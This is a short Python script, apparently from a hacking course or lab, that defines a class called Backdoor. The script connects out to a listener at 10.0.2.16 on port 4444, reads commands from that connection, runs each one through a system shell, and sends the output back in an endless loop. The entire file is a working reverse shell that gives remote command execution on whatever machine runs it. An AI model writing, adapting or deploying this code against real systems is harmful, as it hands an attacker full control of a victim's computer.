import socket
import subprocess

class Backdoor:
  def __init__(self, ip, port):
    self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.connection.connect((ip, port))
      
  def execute_system_command(self, command):
    return subprocess.check_output(command, shell=True)

  def run(self):
    while True:
      command = self.connection.recv(1024)
      result = self.execute_system_command(command)
      self.connection.send(result)
    connection.close()


backdoor = Backdoor("10.0.2.16", 4444)
backdoor.run()

